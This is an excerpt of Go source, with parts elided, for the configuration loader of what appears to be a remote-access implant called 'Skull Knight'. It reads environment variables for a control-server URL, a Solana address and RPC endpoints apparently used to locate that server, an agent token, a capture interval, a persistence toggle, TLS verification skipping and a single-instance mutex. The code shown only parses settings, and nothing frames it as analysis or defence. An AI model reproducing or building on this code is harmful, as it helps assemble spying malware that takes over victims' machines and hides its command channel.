...
func Load() Config {
	server := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_SERVER"))
	if server == "" {
		server = DefaultServerURL
	}

	rawServerFlag := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_SERVER_RAW"))
	if rawServerFlag == "" {
		rawServerFlag = DefaultServerURLIsRaw
	}
	rawServerEnabled := isTruthy(rawServerFlag)

	solFlag := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_SERVER_SOL"))
	if solFlag == "" {
		solFlag = DefaultServerURLIsSol
	}
	solEnabled := isTruthy(solFlag)

	solAddress := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_SOL_ADDRESS"))
	if solAddress == "" {
		solAddress = strings.TrimSpace(DefaultSolAddress)
	}

	solRPCEndpointsStr := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_SOL_RPC_ENDPOINTS"))
	...
	if solEnabled && solAddress != "" && len(solRPCEndpoints) > 0 {
		agentToken := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_AGENT_TOKEN"))
		if agentToken == "" {
	...
	if v := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_CAPTURE_INTERVAL")); v != "" {
	...
	if v := strings.ToLower(strings.TrimSpace(os.Getenv("SKULL_KNIGHT_DISABLE_CAPTURE"))); v != "" {
		disableCapture = v == "true" || v == "1" || v == "yes"
	}

	enablePersistence := strings.ToLower(DefaultPersistence) == "true"
	if v := strings.ToLower(strings.TrimSpace(os.Getenv("SKULL_KNIGHT_ENABLE_PERSISTENCE"))); v != "" {
	...
	if v := strings.ToLower(strings.TrimSpace(os.Getenv("SKULL_KNIGHT_TLS_INSECURE_SKIP_VERIFY"))); v != "" {
		tlsInsecureSkipVerify = v == "true" || v == "1" || v == "yes"
	}
	tlsCAPath := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_TLS_CA"))
	tlsClientCert := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_TLS_CLIENT_CERT"))
	tlsClientKey := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_TLS_CLIENT_KEY"))
	agentToken := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_AGENT_TOKEN"))
	if agentToken == "" {
		agentToken = strings.TrimSpace(DefaultAgentToken)
	}

	mutex := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_MUTEX"))
	if mutex == "" {
		mutex = DefaultMutex
	}
